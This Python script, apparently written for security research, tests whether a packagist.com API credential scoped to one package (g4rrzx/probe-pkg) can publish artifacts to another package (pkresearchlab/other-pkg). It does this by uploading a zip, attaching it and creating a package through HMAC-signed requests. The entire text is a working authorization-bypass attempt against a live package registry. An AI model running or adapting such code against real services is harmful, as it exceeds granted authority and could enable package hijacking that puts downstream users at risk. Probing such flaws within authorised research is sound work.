import base64, hashlib, hmac, json, os, time, urllib.request, urllib.error, urllib.parse
C = json.load(open('/tmp/creds.json'))
KEY, SEC = C.get('key'), C.get('secret')
HOST = 'packagist.com'
if not KEY:
    raise SystemExit('no credential issued')

def sign(method, path, query, body):
    ts = str(int(time.time())); cnonce = base64.b64encode(os.urandom(48)).decode()
    params = {'timestamp': ts, 'cnonce': cnonce, 'key': KEY, 'version': '2', 'query': query or ''}
    if body: params['body'] = body
    def q(v):
        if isinstance(v, bytes): return urllib.parse.quote(v, safe='')
        return urllib.parse.quote(v.encode('utf-8','surrogateescape'), safe='')
    s2s = method.upper()+"\n"+HOST+"\n"+path+"\n"+'&'.join(f"{q(k)}={q(params[k])}" for k in sorted(params))
    sig = base64.b64encode(hmac.new(SEC.encode(), s2s.encode(), hashlib.sha256).digest()).decode()
    return ("PACKAGIST-HMAC-SHA256 Key=%s, Timestamp=%s, Cnonce=%s, Version=2, Signature=%s" % (KEY, ts, cnonce, sig))

def call(method, path, data=None, body_bytes=None, ctype='application/json', extra=None):
    body = body_bytes if body_bytes is not None else (json.dumps(data).encode() if data is not None else None)
    hdr = {'Content-Type': ctype, 'Accept': 'application/json'}
    if extra: hdr.update(extra)
    hdr['Authorization'] = sign(method, path, '', body)
    req = urllib.request.Request('https://'+HOST+path, data=body, headers=hdr, method=method)
    try:
        r = urllib.request.urlopen(req, timeout=45); return r.status, r.read().decode('utf-8','replace')[:1200]
    except urllib.error.HTTPError as e: return e.code, e.read().decode('utf-8','replace')[:1200]
    except Exception as e: return 0, repr(e)[:200]

print('=== FULL PUBLISH FLOW against UNBOUND package pkresearchlab/other-pkg ===')
# The bound package is g4rrzx/probe-pkg. Try to publish a version of other-pkg.
st, body = call('POST', '/api/packages/artifacts/', body_bytes=open('art/other-pkg.zip','rb').read(),
                ctype='application/zip', extra={'X-FILENAME':'other-pkg.zip'})
print(f'1. create artifact                -> [{st}] {body[:160]}')
aid = None
try: aid = json.loads(body).get('id')
except Exception: pass
if aid:
    st2, b2 = call('POST', '/api/packages/pkresearchlab/other-pkg/artifacts/',
                   body_bytes=open('art/other-pkg.zip','rb').read(),
                   ctype='application/zip', extra={'X-FILENAME':'other-pkg.zip'})
    print(f'2. add artifact to other-pkg      -> [{st2}] {b2[:200]}')
    st3, b3 = call('POST', '/api/packages/', data={'repoType':'artifact','artifactIds':[aid]})
    print(f'3. createArtifactPackage([{aid}]) -> [{st3}] {b3[:200]}')
